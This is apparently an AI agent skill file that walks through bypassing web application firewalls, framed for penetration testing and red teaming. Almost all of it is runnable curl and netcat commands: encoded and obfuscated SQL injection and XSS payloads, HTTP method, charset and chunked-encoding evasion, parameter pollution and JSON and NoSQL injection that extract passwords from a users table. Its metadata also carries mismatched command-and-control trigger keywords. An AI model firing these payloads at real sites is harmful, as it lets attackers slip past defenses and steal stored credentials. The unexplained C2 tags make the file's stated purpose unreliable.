---
name: performing-web-application-firewall-bypass
description: "Bypasses WAF protections using encoding tricks. Signals: C2, command and control, remote control."
zh-signals: "Bypasses Web Application Firewall protections using encoding tricks 信号:c2,命令控制,远控。"
when-to-use: Bypasses Web Application Firewall protections using encoding tricks,
  HTTP method manipulation, parameter pollution, and payload obfuscation to smuggle
  SQL injection, XSS, and other exploit payloads past WAF detection rules. Use when
  a confirmed vulnerability is blocked by a WAF, during penetration tests or red
  team engagements requiring bypass of perimeter security controls, or when evaluating
  WAF rule effectiveness and bypass resistance.
domain: cybersecurity
subdomain: web-application-security
tags:
- waf-bypass
- waf-evasion
- sql-injection
- xss
- payload-obfuscation
- encoding-bypass
- web-security
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1027
---

# Performing Web Application Firewall Bypass

## When to Use
- When confirmed vulnerabilities are blocked by WAF signature-based detection
- During penetration testing where WAF prevents exploitation of known issues
- When evaluating WAF rule effectiveness against evasion techniques
- During red team engagements requiring bypass of perimeter security controls
- When testing custom WAF rules for completeness and bypass resistance

## Prerequisites
- Burp Suite Professional with SQLMap integration
- wafw00f for WAF fingerprinting and identification
- SQLMap with tamper scripts for automated WAF bypass
- Understanding of WAF detection mechanisms (signature, regex, behavioral)
- Collection of encoding and obfuscation techniques per attack type
- Knowledge of HTTP protocol nuances exploitable for evasion

## Workflow

### Step 1 — Identify and Fingerprint the WAF
```bash
# Detect WAF using wafw00f
wafw00f http://target.com

# Manual WAF detection via response headers
curl -sI http://target.com | grep -iE "x-cdn|server|x-powered-by|x-sucuri|cf-ray|x-akamai"

# Trigger WAF with known bad payload and analyze response
curl "http://target.com/page?id=1' OR 1=1--" -v
# Look for: 403 Forbidden, custom block page, CAPTCHA challenge

# Common WAF indicators:
# Cloudflare: cf-ray header, __cfduid cookie
# AWS WAF: x-amzn-requestid
# ModSecurity: Mod_Security or OWASP CRS error messages
# Akamai: AkamaiGHost header
# Imperva: incap_ses cookie, visid_incap cookie
```

### Step 2 — Bypass with Encoding and Obfuscation
```bash
# URL encoding bypass
curl "http://target.com/page?id=1%27%20OR%201%3D1--"

# Double URL encoding
curl "http://target.com/page?id=1%2527%2520OR%25201%253D1--"

# Unicode encoding
curl "http://target.com/page?id=1%u0027%u0020OR%u00201%u003D1--"

# HTML entity encoding in body
curl -X POST http://target.com/search \
  -d "q=<script>alert&#40;1&#41;</script>"

# Mixed case SQL keywords
curl "http://target.com/page?id=1' UnIoN SeLeCt password FrOm users--"

# Inline comments between SQL keywords
curl "http://target.com/page?id=1'/*!UNION*//*!SELECT*/password/*!FROM*/users--"

# MySQL version-specific comments
curl "http://target.com/page?id=1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"

# Null bytes
curl "http://target.com/page?id=1'%00 OR 1=1--"

# Tab and newline substitution for spaces
curl "http://target.com/page?id=1'%09UNION%0ASELECT%0D1,2,3--"
```

### Step 3 — Bypass with HTTP Method and Protocol Tricks
```bash
# Change HTTP method (WAFs may only inspect GET/POST)
curl -X PUT "http://target.com/page?id=1' OR 1=1--"
curl -X PATCH "http://target.com/page" -d "id=1' OR 1=1--"

# Use HTTP/0.9 (no headers)
printf "GET /page?id=1' OR 1=1-- \r\n" | nc target.com 80

# Content-Type manipulation
curl -X POST http://target.com/page \
  -H "Content-Type: application/x-www-form-urlencoded; charset=ibm037" \
  -d "id=1' OR 1=1--"

# Multipart form data (may bypass body inspection)
curl -X POST http://target.com/page \
  -F "id=1' OR 1=1--"

# Chunked Transfer-Encoding
printf "POST /page HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nid=1\r\n11\r\n' OR 1=1--\r\n0\r\n\r\n" | nc target.com 80

# Parameter in unusual locations
curl http://target.com/page -H "X-Forwarded-For: 1' OR 1=1--"
curl http://target.com/page -H "Referer: http://target.com/page?id=1' OR 1=1--"
```

### Step 4 — Bypass with Payload Splitting and HPP
```bash
# HTTP Parameter Pollution
curl "http://target.com/page?id=1' UNION&id=SELECT password FROM users--"

# Split payload across parameters
curl "http://target.com/page?id=1'/*&q=*/UNION SELECT 1,2,3--"

# JSON-based SQLi (many WAFs miss JSON payloads)
curl -X POST http://target.com/api/query \
  -H "Content-Type: application/json" \
  -d '{"id": "1 AND 1=1 UNION SELECT password FROM users"}'

# JSON SQL injection with operators
curl -X POST http://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": {"$gt":"", "$where":"1==1"}}'

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
